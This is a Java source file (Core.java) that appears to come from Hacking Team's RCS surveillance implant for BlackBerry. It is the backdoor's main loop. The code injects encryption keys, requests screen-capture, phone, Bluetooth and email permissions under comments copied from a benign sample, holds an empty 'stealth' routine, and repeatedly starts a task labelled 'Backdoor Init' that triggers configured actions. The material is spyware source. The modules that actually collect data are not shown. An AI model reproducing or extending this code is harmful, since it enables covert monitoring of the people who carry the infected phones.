/* *************************************************
c * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry_lib 
 * File         : Core.java 
 * Created      : 26-mar-2010
 * *************************************************/

package com.ht.rcs.blackberry;

import net.rim.device.api.applicationcontrol.ApplicationPermissions;
import net.rim.device.api.applicationcontrol.ApplicationPermissionsManager;
import net.rim.device.api.system.ApplicationDescriptor;
import net.rim.device.api.system.DeviceInfo;

import com.ht.rcs.blackberry.config.InstanceKeys323;
import com.ht.rcs.blackberry.config.Keys;
import com.ht.rcs.blackberry.crypto.Encryption;
import com.ht.rcs.blackberry.utils.Debug;
import com.ht.rcs.blackberry.utils.DebugLevel;
import com.ht.rcs.blackberry.utils.Utils;

/**
 * Classe Core, contiene il main.
 */
public class Core {

    /** The debug instance. */
    private static Debug debug;

    /**
     * Lib main.
     * 
     * @param args
     *            the args
     */
    public static void libMain(final String[] args) {
        Utils.sleep(1000);

        Thread.currentThread().setPriority(Thread.MAX_PRIORITY);

        //#mdebug
        debug.init(true, false);
        debug = new Debug("Core", DebugLevel.VERBOSE);
        debug.trace("RCSBlackBerry launching");
        // #enddebug       

        boolean antennaInstalled = true;
        // #if 1=0
        // @ antennaInstalled = false;
        // #endif
        // #debug
        debug.trace("Antenna: " + antennaInstalled);

        if (!Keys.hasBeenBinaryPatched()) {
            // #debug
            debug.warn("Not binary patched, injecting 323");
            InstanceKeys323.injectKeys323();
        }

        Encryption.init();

        Core core = new Core();
        boolean ret = core.run();

        // #debug
        debug.trace("RCSBlackBerry exit, return " + ret);

        // #debug
        Debug.stop();
    }

    /** The task obj. */
    private Task taskObj = new Task();

    /**
     * Run.
     * 
     * @return true, if successful
     */
    public final boolean run() {

        checkPermissions();
        stealth();

        Utils.sleep(500);

        for (;;) {
            // #debug
            debug.info("init task");
            if (taskObj.taskInit() == false) {
                // #debug
                debug.error("TaskInit() FAILED");
                Msg.demo("Backdoor Init... FAILED");
                Msg.show();
                return false;
            } else {
                //#debug
                debug.trace("TaskInit() OK");
                // CHECK: Status o init?
                Msg.demo("Backdoor Init... OK");
                Msg.show();
            }

            //TODO togliere
            //if (!DeviceInfo.isSimulator()) {
                debug.warn("TRIGGERING ACTION 0");
                Status.getInstance().triggerAction(0, null);
            //}

            // #debug
            debug.info("starting checking actions");
            if (taskObj.checkActions() == false) {
                // #debug
                debug.error("CheckActions() [Uninstalling?] FAILED");
                // chiudere tutti i thread
                // decidere se e' un uninstall
                Msg.demo("Backdoor Uninstalled, reboot the device");
                return false;
            }
        }
    }

    /**
     * Stealth.
     */
    private void stealth() {
        // TODO Auto-generated method stub

    }

    /**
     * This method showcases the ability to check the current permissions for
     * the application. If the permissions are insufficient, the user will be
     * prompted to increase the level of permissions. You may want to restrict
     * permissions for the ApplicationPermissionsDemo.cod module beforehand in
     * order to demonstrate this sample effectively. This can be done in
     * Options/Advanced Options/Applications/(menu)Modules.Highlight
     * 'ApplicationPermissionsDemo' in the Modules list and select 'Edit
     * Permissions' from the menu.
     */
    private void checkPermissions() {
        debug.info("CheckPermissions");
        // NOTE: This sample leverages the following permissions: 
        // --Event Injector
        // --Phone
        // --Device Settings
        // --Email
        // The sample demonstrates how these user defined permissions will
        // cause the respective tests to succeed or fail. Individual 
        // applications will require access to different permissions. 
        // Please review the Javadocs for the ApplicationPermissions class 
        // for a list of all available permissions
        // May 13, 2008: updated permissions by replacing deprecated constants.

        // Capture the current state of permissions and check against the requirements
        ApplicationPermissionsManager apm = ApplicationPermissionsManager
                .getInstance();
        ApplicationPermissions original = apm.getApplicationPermissions();

        // Set up and attach a reason provider
        CoreReasonProvider drp = new CoreReasonProvider();
        apm.addReasonProvider(ApplicationDescriptor
                .currentApplicationDescriptor(), drp);

        if (original
                .getPermission(ApplicationPermissions.PERMISSION_SCREEN_CAPTURE) == ApplicationPermissions.VALUE_ALLOW
                && original
                        .getPermission(ApplicationPermissions.PERMISSION_PHONE) == ApplicationPermissions.VALUE_ALLOW
                && original
                        .getPermission(ApplicationPermissions.PERMISSION_BLUETOOTH) == ApplicationPermissions.VALUE_ALLOW
                && original
                        .getPermission(ApplicationPermissions.PERMISSION_EMAIL) == ApplicationPermissions.VALUE_ALLOW) {
            // All of the necessary permissions are currently available
            debug
                    .info("All of the necessary permissions are currently available");
            return;
        }

        // Create a permission request for each of the permissions your application
        // needs. Note that you do not want to list all of the possible permission
        // values since that provides little value for the application or the user.  
        // Please only request the permissions needed for your application.
        ApplicationPermissions permRequest = new ApplicationPermissions();
        permRequest
                .addPermission(ApplicationPermissions.PERMISSION_SCREEN_CAPTURE);
        permRequest.addPermission(ApplicationPermissions.PERMISSION_PHONE);
        permRequest.addPermission(ApplicationPermissions.PERMISSION_BLUETOOTH);
        permRequest.addPermission(ApplicationPermissions.PERMISSION_EMAIL);

        boolean acceptance = ApplicationPermissionsManager.getInstance()
                .invokePermissionsRequest(permRequest);

        if (acceptance) {
            // User has accepted all of the permissions
            debug.info("User has accepted all of the permissions");
            return;
        } else {
            // The user has only accepted some or none of the permissions 
            // requested. In this sample, we will not perform any additional 
            // actions based on this information. However, there are several 
            // scenarios where this information could be used. For example,
            // if the user denied networking capabilities then the application 
            // could disable that functionality if it was not core to the 
            // operation of the application.
            debug.warn("User has accepted some or none of the permissions");
        }
    }

}
